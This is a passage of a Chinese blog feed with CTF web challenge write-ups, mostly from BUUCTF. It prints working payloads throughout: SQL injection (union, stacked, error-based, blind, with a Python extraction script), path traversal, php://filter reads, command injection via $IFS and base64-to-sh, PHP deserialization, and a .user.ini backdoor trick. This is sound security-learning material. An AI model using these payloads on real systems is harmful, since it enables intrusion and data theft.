href=\"https://www.cnblogs.com/sijidou/p/10522972.html\">https://www.cnblogs.com/sijidou/p/10522972.html</a></p>\n<h2 id=\"flag在管理员手里\"><a class=\"markdownIt-Anchor\" href=\"#flag在管理员手里\">#</a> flag 在管理员手里</h2>\n<p>先抓个包，看到 cookie 里有一个 admin=0，改成 1 不行，还有一个字符串，url 解码以后发现是 s:5:“guest”; 试一下改成 admin 很显然也是不行的，还有就是一个哈希值，估计直接爆破也是不行的，到这里就断了思路。然后看 WP 说找源码，一样的 index.php~ 拿到一个实质为.swp 的 vim 异常退出文件，然后就分析一下源码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span> <br>\t<span class=\"hljs-variable\">$auth</span> = <span class=\"hljs-literal\">false</span>;<br>\t<span class=\"hljs-variable\">$role</span> = <span class=\"hljs-string\">&quot;guest&quot;</span>;<br>\t<span class=\"hljs-variable\">$salt</span> = <br>\t<span class=\"hljs-keyword\">if</span> (<span class=\"hljs-keyword\">isset</span>(<span class=\"hljs-variable\">$_COOKIE</span>[<span class=\"hljs-string\">&quot;role&quot;</span>])) &#123;<br>\t    <span class=\"hljs-variable\">$role</span> = unserialize(<span class=\"hljs-variable\">$_COOKIE</span>[<span class=\"hljs-string\">&quot;role&quot;</span>]);<br>\t    <span class=\"hljs-variable\">$hsh</span> = <span class=\"hljs-variable\">$_COOKIE</span>[<span class=\"hljs-string\">&quot;hsh&quot;</span>];<br>\t    <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-variable\">$role</span>===<span class=\"hljs-string\">&quot;admin&quot;</span> &amp;&amp; <span class=\"hljs-variable\">$hsh</span> === md5(<span class=\"hljs-variable\">$salt</span>.strrev(<span class=\"hljs-variable\">$_COOKIE</span>[<span class=\"hljs-string\">&quot;role&quot;</span>]))) &#123;<br>\t        <span class=\"hljs-variable\">$auth</span> = <span class=\"hljs-literal\">true</span>;<br>\t    &#125; <span class=\"hljs-keyword\">else</span> &#123;<br>\t        <span class=\"hljs-variable\">$auth</span> = <span class=\"hljs-literal\">false</span>;<br>\t    &#125;<br>\t&#125; <span class=\"hljs-keyword\">else</span> &#123;<br>\t    <span class=\"hljs-variable\">$s</span> = serialize(<span class=\"hljs-variable\">$role</span>);<br>\t    setcookie(<span class=\"hljs-string\">&#x27;role&#x27;</span>,<span class=\"hljs-variable\">$s</span>);<br>\t    <span class=\"hljs-variable\">$hsh</span> = md5(<span class=\"hljs-variable\">$salt</span>.strrev(<span class=\"hljs-variable\">$s</span>));<br>\t    setcookie(<span class=\"hljs-string\">&#x27;hsh&#x27;</span>,<span class=\"hljs-variable\">$hsh</span>);<br>\t&#125;<br>\t<span class=\"hljs-keyword\">if</span> (<span class=\"hljs-variable\">$auth</span>) &#123;<br>\t    <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">&quot;&lt;h3&gt;Welcome Admin. Your flag is </span><br><span class=\"hljs-string\">\t&#125; else &#123;</span><br><span class=\"hljs-string\">\t    echo &quot;</span>&lt;h3&gt;Only Admin can see the flag!!&lt;/h3&gt;<span class=\"hljs-string\">&quot;;</span><br><span class=\"hljs-string\">\t&#125;</span><br><span class=\"hljs-string\">?&gt;</span><br></code></pre></td></tr></table></figure>\n<p H45h_ext3ndeR_i5_easy_to_us3=\"\">可以看到哈希值是 md5 (salt + 反向 “admin”)；应该是哈希的某种攻击方法。了解到应该可以进行哈希长度拓展攻击。<br>\n（参考 https://www.cnblogs.com/pcat/p/5478509.html）<br>\nPCTF</p>\n<h2 id=\"chopper\"><a class=\"markdownIt-Anchor\" href=\"#chopper\">#</a> Chopper</h2>\n<p>进入管理员登陆界面，查看源代码发现 “admin ip is 202.5.19.128”；</p>\n<h2 id=\"simple-injection\"><a class=\"markdownIt-Anchor\" href=\"#simple-injection\">#</a> Simple Injection</h2>\n<p>发现当输入的账号是 admin 的时候回显是密码错误，输入其他账户的时候回显是密码错误。当账户名用 admin’ #发现可以但是用 admin’ and 1=1 #时被过滤了，再试一下 <code>admin'/**/and/**/</code>  发现没有被过滤，也就是这里存在注入点，根据回显可以尝试 bool 盲注或者时间盲注。<br>\n不过看了 WP 才发现还有一种更简单的方法<br>\n直接用 payload <code>username=miracle778'/**/union(select(md5('123')))#&amp;password=123</code>  就能拿到 flag</p>\n",
            "tags": []
        },
        {
            "id": "http://blog.m1n.me/2019/11/20/BUUCTF-WP/",
            "url": "http://blog.m1n.me/2019/11/20/BUUCTF-WP/",
            "title": "BUUCTF-WP",
            "date_published": "2019-11-20T14:49:13.000Z",
            "content_html": "<p>BUUCTF 部分题解<br>\n OJ 链接 https://buuoj.cn/challenges</p>\n<span id=\"more\"></span>\n<h1 id=\"web\"><a class=\"markdownIt-Anchor\" href=\"#web\">#</a> Web</h1>\n<h2 id=\"hctf-2018warmup\"><a class=\"markdownIt-Anchor\" href=\"#hctf-2018warmup\">#</a> [HCTF 2018]WarmUp</h2>\n<ol>\n<li>先查看网页源代码，发现 source.php，就读到了源码，然后还有一个 hint.php 可以看到 flag 在 ffffllllaaaagggg</li>\n<li>分析一下源码：</li>\n</ol>\n<figure class=\"highlight autoit\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs autoit\">$_page = mb_substr(<br>                $page,<br>                <span class=\"hljs-number\">0</span>,<br>                mb_strpos($page . <span class=\"hljs-string\">&#x27;?&#x27;</span>, <span class=\"hljs-string\">&#x27;?&#x27;</span>)<br>            )<span class=\"hljs-comment\">;</span><br></code></pre></td></tr></table></figure>\n<p>可以看到它是根据？的位置来截取，因此可以构造 paylaod： <code>?file=hint.php?../../../../../../../ffffllllaaaagggg</code>  就读到了 flag</p>\n<h2 id=\"强网杯-2019随便注\"><a class=\"markdownIt-Anchor\" href=\"#强网杯-2019随便注\">#</a> [强网杯 2019] 随便注</h2>\n<ol>\n<li>先用单引号闭合，发现报错，然后用 order by 测试出字段数为 2，再尝试 union 注入发现过滤： <code>return preg_match(&quot;/select|update|delete|drop|insert|where|\\./i&quot;,$inject);</code></li>\n<li>payload: <code>1';show databases #</code> 拿到数据库名<br>\n array (1) {<br>\n[0]=&gt;<br>\nstring(11) “ctftraining”<br>\n}</li>\n</ol>\n<p>array(1) {<br>\n[0]=&gt;<br>\nstring(18) “information_schema”<br>\n}</p>\n<p>array(1) {<br>\n[0]=&gt;<br>\nstring(5) “mysql”<br>\n}</p>\n<p>array(1) {<br>\n[0]=&gt;<br>\nstring(18) “performance_schema”<br>\n}</p>\n<p>array(1) {<br>\n[0]=&gt;<br>\nstring(9) “supersqli”<br>\n}</p>\n<p>array(1) {<br>\n[0]=&gt;<br>\nstring(4) “test”<br>\n}<br>\n3.  <code>1'; show tables from ctftraining #</code> 拿到表名<br>\n array (1) {<br>\n[0]=&gt;<br>\nstring(10) “FLAG_TABLE”<br>\n}</p>\n<p>array(1) {<br>\n[0]=&gt;<br>\nstring(4) “news”<br>\n}</p>\n<p>array(1) {<br>\n[0]=&gt;<br>\nstring(5) “users”<br>\n}<br>\n4.  <code>1';show columns from ctftraining.FLAG_TABLE #</code> 发现不行，被过滤了？？<br>\n5.  <code>1';show tables #</code> 看到有两个表</p>\n<p>array(1) {<br>\n[0]=&gt;<br>\nstring(16) “1919810931114514”<br>\n}</p>\n<p>array(1) {<br>\n[0]=&gt;<br>\nstring(5) “words”<br>\n}<br>\n 6. 分别查看 words 和 1919810931114514 里面有些什么</p>\n<p><code>1';show columns from words #</code> :array(6) {<br>\n[0]=&gt;<br>\nstring(2) “id”<br>\n[1]=&gt;<br>\nstring(7) “int(10)”<br>\n[2]=&gt;<br>\nstring(2) “NO”<br>\n[3]=&gt;<br>\nstring(0) “”<br>\n[4]=&gt;<br>\nNULL<br>\n[5]=&gt;<br>\nstring(0) “”<br>\n}</p>\n<p>array(6) {<br>\n[0]=&gt;<br>\nstring(4) “data”<br>\n[1]=&gt;<br>\nstring(11) “varchar(20)”<br>\n[2]=&gt;<br>\nstring(2) “NO”<br>\n[3]=&gt;<br>\nstring(0) “”<br>\n[4]=&gt;<br>\nNULL<br>\n[5]=&gt;<br>\nstring(0) “”<br>\n}<br>\n <code>1';show columns from </code> 1919810931114514 <code> #</code> （注意这里要加反引号）：array (6) {<br>\n[0]=&gt;<br>\nstring(4) “flag”<br>\n[1]=&gt;<br>\nstring(12) “varchar(100)”<br>\n[2]=&gt;<br>\nstring(2) “NO”<br>\n[3]=&gt;<br>\nstring(0) “”<br>\n[4]=&gt;<br>\nNULL<br>\n[5]=&gt;<br>\nstring(0) “”<br>\n} 看到了有 flag<br>\n7. 接下来怎么读到 flag 就是关键了</p>\n<figure class=\"highlight applescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs applescript\"><span class=\"hljs-number\">1</span>&#x27;; alter table <span class=\"hljs-built_in\">words</span> rename <span class=\"hljs-keyword\">to</span> words1;alter table `<span class=\"hljs-number\">1919810931114514</span>` rename <span class=\"hljs-keyword\">to</span> <span class=\"hljs-built_in\">words</span>;alter table <span class=\"hljs-built_in\">words</span> change flag <span class=\"hljs-built_in\">id</span> varchar(<span class=\"hljs-number\">50</span>);<span class=\"hljs-comment\">#</span><br></code></pre></td></tr></table></figure>\n<figure class=\"highlight applescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs applescript\"><span class=\"hljs-number\">1</span>&#x27;; alter table <span class=\"hljs-built_in\">words</span> rename <span class=\"hljs-keyword\">to</span> words1;alter table `<span class=\"hljs-number\">1919810931114514</span>` rename <span class=\"hljs-keyword\">to</span> <span class=\"hljs-built_in\">words</span>;alter table <span class=\"hljs-built_in\">words</span> add <span class=\"hljs-built_in\">id</span> int;a;ter table <span class=\"hljs-built_in\">words</span> alter <span class=\"hljs-built_in\">id</span> <span class=\"hljs-keyword\">set</span> default <span class=\"hljs-number\">1</span>;<br></code></pre></td></tr></table></figure>\n<p>然后用 <code>1'or 1=1 #</code> 拿到 flag</p>\n<p>另 payload：</p>\n<figure class=\"highlight smali\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs smali\">1&#x27;;<br>SeT@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;<br>prepare execsql from @a;<span class=\"hljs-built_in\"></span><br><span class=\"hljs-built_in\">execute </span>execsql;<span class=\"hljs-comment\">#</span><br></code></pre></td></tr></table></figure>\n<h2 id=\"护网杯-2018easy_tornado\"><a class=\"markdownIt-Anchor\" href=\"#护网杯-2018easy_tornado\">#</a> [护网杯 2018] easy_tornado</h2>\n<p>SSTI，handler.settings 拿 secret-cookie</p>\n<h2 id=\"极客大挑战-2019easysql\"><a class=\"markdownIt-Anchor\" href=\"#极客大挑战-2019easysql\">#</a> [极客大挑战 2019] EasySQL</h2>\n<p>万能密码直接拿 flag</p>\n<h2 id=\"roarctf-2019easy-calc\"><a class=\"markdownIt-Anchor\" href=\"#roarctf-2019easy-calc\">#</a> [RoarCTF 2019]Easy Calc</h2>\n<p>查看源代码发现 /calc.php?num=，访问 calc.php 拿到源码：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span><br>error_reporting(<span class=\"hljs-number\">0</span>);<br><span class=\"hljs-keyword\">if</span>(!<span class=\"hljs-keyword\">isset</span>(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">&#x27;num&#x27;</span>]))&#123;<br>    show_source(<span class=\"hljs-keyword\">__FILE__</span>);<br>&#125;<span class=\"hljs-keyword\">else</span>&#123;<br>        <span class=\"hljs-variable\">$str</span> = <span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">&#x27;num&#x27;</span>];<br>        <span class=\"hljs-variable\">$blacklist</span> = [<span class=\"hljs-string\">&#x27; &#x27;</span>, <span class=\"hljs-string\">&#x27;\\t&#x27;</span>, <span class=\"hljs-string\">&#x27;\\r&#x27;</span>, <span class=\"hljs-string\">&#x27;\\n&#x27;</span>,<span class=\"hljs-string\">&#x27;\\&#x27;&#x27;</span>, <span class=\"hljs-string\">&#x27;&quot;&#x27;</span>, <span class=\"hljs-string\">&#x27;`&#x27;</span>, <span class=\"hljs-string\">&#x27;\\[&#x27;</span>, <span class=\"hljs-string\">&#x27;\\]&#x27;</span>,<span class=\"hljs-string\">&#x27;\\$&#x27;</span>,<span class=\"hljs-string\">&#x27;\\\\&#x27;</span>,<span class=\"hljs-string\">&#x27;\\^&#x27;</span>];<br>        <span class=\"hljs-keyword\">foreach</span> (<span class=\"hljs-variable\">$blacklist</span> <span class=\"hljs-keyword\">as</span> <span class=\"hljs-variable\">$blackitem</span>) &#123;<br>                <span class=\"hljs-keyword\">if</span> (preg_match(<span class=\"hljs-string\">&#x27;/&#x27;</span> . <span class=\"hljs-variable\">$blackitem</span> . <span class=\"hljs-string\">&#x27;/m&#x27;</span>, <span class=\"hljs-variable\">$str</span>)) &#123;<br>                        <span class=\"hljs-keyword\">die</span>(<span class=\"hljs-string\">&quot;what are you want to do?&quot;</span>);<br>                &#125;<br>        &#125;<br>        <span class=\"hljs-keyword\">eval</span>(<span class=\"hljs-string\">&#x27;echo &#x27;</span>.<span class=\"hljs-variable\">$str</span>.<span class=\"hljs-string\">&#x27;;&#x27;</span>);<br>&#125;<br><span class=\"hljs-meta\">?&gt;</span> <br></code></pre></td></tr></table></figure>\n<p>php 的解析规则，当 php 进行解析的时候，如果变量前面有空格，会去掉前面的空格再解析，也就是说我们只需要用 <code>? num=</code>  就可以绕过 waf 的检测，但是这样只能绕过 waf 但是并不能绕过黑名单检测。用 chr (47) 绕过 <code>\\</code>  检测。</p>\n<h2 id=\"hctf-2018admin\"><a class=\"markdownIt-Anchor\" href=\"#hctf-2018admin\">#</a> [HCTF 2018]admin</h2>\n<p>出题人 WP：“<a href=\"https://www.ckj123.com/?p=147\">https://www.ckj123.com/?p=147</a>”</p>\n<p>修改密码页面注释有 git 源码泄露，<a href=\"https://github.com/woadsl1234/hctf_flask/%EF%BC%8C\">https://github.com/woadsl1234/hctf_flask/，</a></p>\n<p>据说本题有多种解法，一是 flask 的 session 机制，session 泄露后解密出来，修改 name 的值为 admin 再用源码中的 secret-key 加密，就可以实现位置 admin。二是用到 Unicode 同形字引起的安全问题：</p>\n<p>spotify 任意用户密码修改漏洞](<a href=\"https://labs.spotify.com/2013/06/18/creative-usernames/\">https://labs.spotify.com/2013/06/18/creative-usernames/</a>)<br>\n 漏洞简介:<br>\n 找一个需要黑掉的账号，比如以 bigbird 为例。创建一个账户名为 ᴮᴵᴳᴮᴵᴿᴰ (in python this is the string u’\\u1d2e\\u1d35\\u1d33\\u1d2e\\u1d35\\u1d3f\\u1d30′)。然后申请修改忘记密码，修改自己申请的账号密码。修改之后以刚刚设置的密码登录 bigbird。就可以成功登录。三是条件竞争。</p>\n<h2 id=\"极客大挑战-2019secret-file\"><a class=\"markdownIt-Anchor\" href=\"#极客大挑战-2019secret-file\">#</a> [极客大挑战 2019] Secret File</h2>\n<p>base64_decode(/secr3t.php?file=php://filter/convert.base64-encode/resource=flag.php)</p>\n<h2 id=\"极客大挑战-2019lovesql\"><a class=\"markdownIt-Anchor\" href=\"#极客大挑战-2019lovesql\">#</a> [极客大挑战 2019] LoveSQL</h2>\n<p><code>check.php?username=admin&amp;password=-1'/**/union/**/select/**/1,database(),database()/**/%23</code>  拿到数据库名 =&gt;‘geek’</p>\n<p><code>check.php?username=admin&amp;password=-1'/**/union/**/select/**/1,2,(select/**/table_name/**/from/**/information_schema.tables/**/where/**/table_schema=database()/**/limit/**/0,1)/**/%23</code>  拿到表名 =&gt;‘geekuser’,‘l0ve1ysq1’</p>\n<p><code>check.php?username=admin&amp;password=-1'/**/union/**/select/**/1,2,(select/**/password/**/from/**/l0ve1ysq1/**/limit/**/15,1)/**/%23</code>  拿到 flag=&gt;‘flag {6d319459-bf52-4be1-8371-83d8d2b8a8d2}’</p>\n<h2 id=\"极客大挑战-2019php\"><a class=\"markdownIt-Anchor\" href=\"#极客大挑战-2019php\">#</a> [极客大挑战 2019] PHP</h2>\n<p>/www.zip 源码</p>\n<p>看源码是 PHP 反序列化</p>\n<p>exp：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span><br><span class=\"hljs-class\"><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title\">Name</span></span>&#123;<br>    <span class=\"hljs-keyword\">private</span> <span class=\"hljs-variable\">$username</span> = <span class=\"hljs-string\">&#x27;admin&#x27;</span>;<br>    <span class=\"hljs-keyword\">private</span> <span class=\"hljs-variable\">$password</span> = <span class=\"hljs-number\">100</span>;<br>&#125;<br><span class=\"hljs-variable\">$a</span> = <span class=\"hljs-keyword\">new</span> Name;<br>var_dump(urlencode(serialize(<span class=\"hljs-variable\">$a</span>)));<br></code></pre></td></tr></table></figure>\n<h2 id=\"极客大挑战-2019knife\"><a class=\"markdownIt-Anchor\" href=\"#极客大挑战-2019knife\">#</a> [极客大挑战 2019] Knife</h2>\n<p>白给一句话</p>\n<h2 id=\"极客大挑战-2019http\"><a class=\"markdownIt-Anchor\" href=\"#极客大挑战-2019http\">#</a> [极客大挑战 2019] Http</h2>\n<p>/Secret.php</p>\n<p>改 Referer、UA、X-Forwarded-For</p>\n<h2 id=\"suctf-2019checkin\"><a class=\"markdownIt-Anchor\" href=\"#suctf-2019checkin\">#</a> [SUCTF 2019]CheckIn</h2>\n<p>.user.ini(<a href=\"https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html\">https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html</a>)</p>\n<p>主要利用就是在.user.ini 文件中写入： <code>auto_prepend_file=01.gif</code> , 就会在目录下的 php 文件中自动包含 01.gif</p>\n<h2 id=\"gxyctf2019ping-ping-ping\"><a class=\"markdownIt-Anchor\" href=\"#gxyctf2019ping-ping-ping\">#</a> [GXYCTF2019]Ping Ping Ping</h2>\n<ol>\n<li>\n<p>利用；或者 | 可以执行命令</p>\n</li>\n<li>\n<p>发现不能有空格，可以 $IFS 绕过，另外还有</p>\n<figure class=\"highlight mel\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs mel\">&lt; 、&lt;&gt;、%20(space)、%09(tab)、$IFS$9、 $&#123;IFS&#125;、$IFS、&#123;cat,flag.php&#125;<br></code></pre></td></tr></table></figure>\n</li>\n<li>\n<p>不能出现 flag，通配符也不能用，只好直接全都读出来</p>\n<figure class=\"highlight stata\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs stata\">/?ip=127.0.0.1|<span class=\"hljs-keyword\">cat</span><span class=\"hljs-variable\">$IFS</span>`<span class=\"hljs-keyword\">ls</span>`<br></code></pre></td></tr></table></figure>\n<p>或者 <code>echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh</code></p>\n</li>\n<li>\n<p>另外黑名单绕过还有以下这些方法</p>\n</li>\n</ol>\n<h2 id=\"actf2020-新生赛include\"><a class=\"markdownIt-Anchor\" href=\"#actf2020-新生赛include\">#</a> [ACTF2020 新生赛] Include</h2>\n<p>base64_decode(/?file=php://filter/convert.base64-encode/resource=flag.php)</p>\n<h2 id=\"actf2020-新生赛backupfile\"><a class=\"markdownIt-Anchor\" href=\"#actf2020-新生赛backupfile\">#</a> [ACTF2020 新生赛] BackupFile</h2>\n<p>常见备份文件 *.swp   *.bak</p>\n<p>访问 index.php.bak 拿到源码</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\"><span class=\"hljs-variable\">$key</span> = intval(<span class=\"hljs-variable\">$key</span>);<br><span class=\"hljs-variable\">$str</span> = <span class=\"hljs-string\">&quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;</span>;<br>    <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-variable\">$key</span> == <span class=\"hljs-variable\">$str</span>) &#123;<br>        <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">$flag</span>;<br>    &#125;<br></code></pre></td></tr></table></figure>\n<p>index.php?key=123 拿到 flag</p>\n<h2 id=\"ciscn2019-华北赛区-day2-web1hack-world\"><a class=\"markdownIt-Anchor\" href=\"#ciscn2019-华北赛区-day2-web1hack-world\">#</a> [CISCN2019 华北赛区 Day2 Web1] Hack World</h2>\n<ol>\n<li>题目提示是 SQL，单引号闭合没有用，双引号又被过滤了，猜测是数字型注入</li>\n<li>测试发现 0，1，2 返回结果不同，应该存在 bool 注入</li>\n<li>fuzz 一下测试过滤了哪些</li>\n<li><code>0^(ascii(substr((select(flag)from(flag)),1,1))&gt;1)</code> + <code>0^(ascii(substr((select(flag)from(flag)),1,1))&gt;1000)</code>  结果不同，盲注拿 flag</li>\n</ol>\n<h2 id=\"极客大挑战-2019babysql\"><a class=\"markdownIt-Anchor\" href=\"#极客大挑战-2019babysql\">#</a> [极客大挑战 2019] BabySQL</h2>\n<ol>\n<li><code>|| 1=1 #</code> 拿到 admin 密码：”667252cbf386409fcf10e06a81c1c19a“。登陆之后发现没啥用</li>\n<li><code>password=1'%20uniunionon%20seselectlect%201,2,3%23</code>  测试可以注入</li>\n<li><code>password=1'%20uniunionon%20seselectlect%201,2,(seselectlect%20table_name%20frfromom%20infoorrmation_schema.tables%20whewherere%20table_schema=database()%20limit%200,1)%23</code>  拿到表名 =&gt;”b4bsql、geekuser“</li>\n<li><code>password=1'%20uniunionon%20seselectlect%201,2,(seleselectct%20column_name%20frfromom%20infoorrmation_schema.columns%20whwhereere%20table_name='b4bsql'%20limit%200,1)%23 </code> 拿到字段名 =&gt;“id、username、password”</li>\n<li><code>password=1'%20uniunionon%20seselectlect%201,2,(seleselectct%20passwoorrd%20frfromom%20b4bsql%20limit%207,1)%23</code>  拿到 flag</li>\n</ol>\n<h2 id=\"极客大挑战-2019hardsql\"><a class=\"markdownIt-Anchor\" href=\"#极客大挑战-2019hardsql\">#</a> [极客大挑战 2019] HardSQL</h2>\n<ol>\n<li>\n<p>报错注入，payload</p>\n<figure class=\"highlight apache\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs apache\"><span class=\"hljs-attribute\">username</span>=admin&amp;password=admin%<span class=\"hljs-number\">27</span>^extractvalue(<span class=\"hljs-number\">1</span>,concat(<span class=\"hljs-number\">0</span>x<span class=\"hljs-number\">7</span>e,(select(right((password),<span class=\"hljs-number\">30</span>))from(H<span class=\"hljs-number\">4</span>rDsq<span class=\"hljs-number\">1</span>))))%<span class=\"hljs-number\">23</span><br></code></pre></td></tr></table></figure>\n</li>\n<li>\n<p>flag 用 left 和 right 函数拼接</p>\n</li>\n</ol>\n<h2 id=\"极客大挑战-2019finalsql\"><a class=\"markdownIt-Anchor\" href=\"#极客大挑战-2019finalsql\">#</a> [极客大挑战 2019] FinalSQL</h2>\n<ol>\n<li>\n<p>题目提示盲注，测试 <code>/search.php?id=0^1</code>  可以发现存在盲注点</p>\n</li>\n<li>\n<p>exp：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">import</span> requests<br><br>url = <span class=\"hljs-string\">&quot;http://b766a75e-ee4f-41c7-847a-aac535a77c88.node3.buuoj.cn/search.php?id=&quot;</span><br><br><span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">get</span>(<span class=\"hljs-params\">i,j</span>):</span><br>\t<span class=\"hljs-comment\">#payload = url + &quot;0^(ascii(substr((database()),&#123;0&#125;,1))&gt;&#123;1&#125;)&quot;.format(i,j) =&gt;&#x27;geek&#x27;</span><br>\t<span class=\"hljs-comment\"># payload = url + &quot;0^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)=&#x27;geek&#x27;),&#123;0&#125;,1))&gt;&#123;1&#125;)&quot;.format(i,j)=&gt;&#x27;F1naI1y,Flaaaaag&#x27;</span><br>\t<span class=\"hljs-comment\"># payload = url + &quot;0^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name)=&#x27;F1naI1y&#x27;),&#123;0&#125;,1))&gt;&#123;1&#125;)&quot;.format(i,j)=&gt;&#x27;id,username,password&#x27;</span><br>\tpayload = url + <span class=\"hljs-string\">&quot;0^(ascii(substr((select(group_concat(password))from(F1naI1y)),&#123;0&#125;,1))&gt;&#123;1&#125;)&quot;</span>.<span class=\"hljs-built_in\">format</span>(i,j)<br>\t<span class=\"hljs-built_in\">print</span>(payload)<br>\tr = requests.get(payload)<br>\thtml = r.text<br>\t<span class=\"hljs-keyword\">if</span> <span class=\"hljs-string\">&quot;Click&quot;</span> <span class=\"hljs-keyword\">in</span> html:<br>\t\t<span class=\"hljs-keyword\">return</span> <span class=\"hljs-literal\">True</span><br>\t<span class=\"hljs-keyword\">else</span>:<br>\t\t<span class=\"hljs-keyword\">return</span> <span class=\"hljs-literal\">False</span><br><br><br><span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">find</span>(<span class=\"hljs-params\">i</span>):</span><br>\tm1n = <span class=\"hljs-number\">33</span><br>\tm4x = <span class=\"hljs-number\">126</span><br>\t<span class=\"hljs-keyword\">while</span> m1n&lt;=m4x:<br>\t\tmid = (m1n+m4x)//<span class=\"hljs-number\">2</span><br>\t\t<span class=\"hljs-keyword\">if</span> get(i,mid):<br>\t\t\tm1n = mid+<span class=\"hljs-number\">1</span><br>\t\t<span class=\"hljs-keyword\">else</span>:<br>\t\t\tm4x = mid-<span class=\"hljs-number\">1</span><br><br>\t<span class=\"hljs-keyword\">return</span> <span class=\"hljs-built_in\">chr</span>((m1n+m4x+<span class=\"hljs-number\">1</span>)//<span class=\"hljs-number\">2</span>)<br><br>flag = <span class=\"hljs-string\">&quot;&quot;</span><br><span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> <span class=\"hljs-built_in\">range</span>(<span class=\"hljs-number\">100</span>,<span class=\"hljs-number\">1000</span>):<br>\ta = find(i)<br>\t<span class=\"hljs-keyword\">if</span> a==<span class=\"hljs-string\">&#x27;!&#x27;</span>:<br>\t\t<span class=\"hljs-keyword\">break</span><br>\tflag += a<br>\t<span class=\"hljs-built_in\">print</span>(flag)<br><span class=\"hljs-built_in\">print</span>(<span 